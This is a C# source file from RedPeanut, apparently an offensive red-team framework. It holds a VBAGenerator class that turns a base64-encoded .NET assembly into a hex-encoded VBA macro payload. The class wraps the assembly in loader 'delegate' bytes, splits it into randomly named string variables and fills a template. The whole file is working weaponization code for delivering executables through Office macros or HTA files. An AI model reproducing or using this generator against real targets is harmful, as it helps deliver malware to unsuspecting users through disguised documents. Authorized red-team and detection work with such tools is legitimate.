//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using static RedPeanut.Utility;

namespace RedPeanut
{
    public class VBAGenerator : IGenerator
    {
        string base64assembly = "";
        Dictionary<string, string> agr = new Dictionary<string, string>();

        public VBAGenerator(string base64Assembly, Dictionary<string, string> agrs)
        {
            this.base64assembly = base64Assembly;

        }

        public string Base64Assembly
        {
            get
            {
                return base64assembly;
            }
            set
            {
                this.base64assembly = value;
            }
        }
        
        public string GetScriptText()
        {
            // generate .hta content
            Random random = new Random();
            string assembly = RandomAString(10,random);
            string runcode = RandomAString(10, random);

            string templatePath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, TEMPLATE_FOLDER, VBA_TEMPLATE);

            string delegatepre = ReadResourceFile(PL_BINARY_DELEGATE_PRE_35);
            string delegatepost = ReadResourceFile(PL_BINARY_DELEGATE_POST_35);

            byte[] delegatebyte = Convert.FromBase64String(delegatepre)
                .Concat(Convert.FromBase64String(this.base64assembly))
                .Concat(Convert.FromBase64String(delegatepost))
                .ToArray();

            string hexdelegate = GetHexString(delegatebyte);

            int lineLength = 80;

            List<string> splitString = new List<string>();

            for (int i = 0; i < hexdelegate.Length; i += lineLength)
            {
                splitString.Add(hexdelegate.Substring(i, Math.Min(lineLength, hexdelegate.Length - i)));
            }

            StringBuilder base64assemblyFormatted = new StringBuilder();
            foreach (string s in splitString)
                base64assemblyFormatted.Append(String.Format("{0} = {0} & \"{1}\"\r\n", assembly, s));


            if (File.Exists(templatePath))
            {
                StringBuilder sb = new StringBuilder(File.ReadAllText(templatePath));

                sb.Replace("#{hexassembly}", base64assemblyFormatted.ToString())
                    .Replace("#{assembly}", assembly)
                    .Replace("#{runcode}", runcode);

                Console.WriteLine("[*] Replace end");

                return sb.ToString() ;
            }
            else
            {
                Console.WriteLine("[x] Template not found");
                return "";
            }                     
        }

        private string GetHexString(byte[] bytes)
        {
            return BitConverter.ToString(bytes).Replace("-", "");
        }
    }
}
